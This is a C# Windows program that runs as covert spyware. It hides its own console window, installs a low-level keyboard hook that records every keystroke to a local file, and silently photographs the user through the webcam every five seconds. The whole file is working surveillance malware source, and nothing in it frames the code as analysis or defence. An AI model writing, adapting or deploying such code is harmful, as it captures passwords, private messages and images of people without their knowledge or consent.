using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Timers;
using OpenCvSharp;

class Program
{
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string logFile = "keylog.txt";
    private static string currentLine = "";


    private static VideoCapture? capture;
    static System.Timers.Timer? cameraTimer;
    static string photoFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "photos");

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();


    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    private const int SW_HIDE = 0;

    //ss

    static void Main()
    {
        HideConsole();
        Directory.CreateDirectory(photoFolder);

        capture = new VideoCapture(0);
        if (capture == null || !capture.IsOpened())
        {
            return;
        }

        cameraTimer = new System.Timers.Timer(5000);
        cameraTimer.Elapsed += TakePhoto;
        cameraTimer.Start();

        _hookID = SetHook(_proc);
        Application.Run();

        UnhookWindowsHookEx(_hookID);
        cameraTimer.Stop();
        capture.Release();
    }

    private static void HideConsole()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        {
            ProcessModule? curModule = curProcess.MainModule;
            if (curModule == null)
            {
                throw new InvalidOperationException("Unable to retrieve the current process module.");
            }
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private const int WM_KEYDOWN = 0x0100;
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;

            if (key == Keys.Enter)
            {
                File.AppendAllText(logFile, currentLine + Environment.NewLine);
                currentLine = "";
            }
            else if (key == Keys.Space)
            {
                currentLine += " ";
            }
            else
            {
                currentLine += key.ToString();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void TakePhoto(object? sender, ElapsedEventArgs e)
    {
        if (capture == null)
        {
            return;
        }

        using (Mat frame = new Mat())
        {
            bool success = capture.Read(frame);
            if (success && !frame.Empty())
            {
                string fileName = Path.Combine(photoFolder, $"photo_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                Cv2.ImWrite(fileName, frame);
            }
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
